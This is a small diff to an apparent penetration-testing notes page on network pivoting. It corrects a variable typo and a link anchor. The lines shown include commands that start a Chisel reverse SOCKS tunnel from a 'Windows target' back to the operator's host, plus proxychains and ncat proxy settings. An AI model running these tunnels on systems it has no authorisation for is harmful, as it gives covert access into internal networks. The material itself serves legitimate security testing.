@@ -26,7 +26,7 @@ Server and client can be both started with [Chisel](https://github.com/jpillora/
 chisel server --port $lport --reverse
 
 # Start chisel client on a Windows target.
-chisel.exe client $lhost:$Lport R:socks
+chisel.exe client $lhost:$lport R:socks
 
 # Modify /etc/proxychains4.conf.
 socks5 127.0.0.1 1080
@@ -36,4 +36,4 @@ ssh -o ProxyCommand="ncat --proxy-type socks5 --proxy 127.0.0.1:$socks_port %h %
 ```
 
 {: .important }
-> If you want to perform port scanning through port tunneling, you should consider using [Naabu](/network/scanning/#Naabu).
+> If you want to perform port scanning through port tunneling, you should consider using [Naabu](/network/scanning/#naabu).
